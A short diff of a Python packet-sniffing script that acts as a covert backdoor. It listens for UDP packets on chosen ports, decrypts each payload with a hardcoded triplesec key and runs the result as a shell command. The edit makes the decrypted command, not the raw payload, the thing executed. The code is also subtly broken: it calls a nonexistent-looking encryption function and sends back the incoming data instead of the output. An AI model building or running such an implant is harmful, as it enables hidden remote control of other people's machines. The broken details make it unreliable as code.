@@ -35,10 +35,10 @@ args = parser.parse_args()
 sniffFilter = "udp and src port {0} and dst port {1}".format(args.sourcePort, args.destPort)
 
 def runCommand(packet):
-  encryptedData = packet.load
+  encryptedData = packet['Raw'].load
   data = triplesec.decrypt(encryptedData, b'key yo')
-  print "Running command " + packet.load
-  output = subprocess.check_output(packet.load, shell=True, stderr=subprocess.STDOUT)
+  print "Running command " + data
+  output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
   encryptedOutput = triplesec.encryptedData(output, b'key yo')
   packet = IP(packet[0][1].src)/UDP(dport=int(args.sourcePort), sport=int(args.destPort))/Raw(load=encryptedData)
   send(packet)
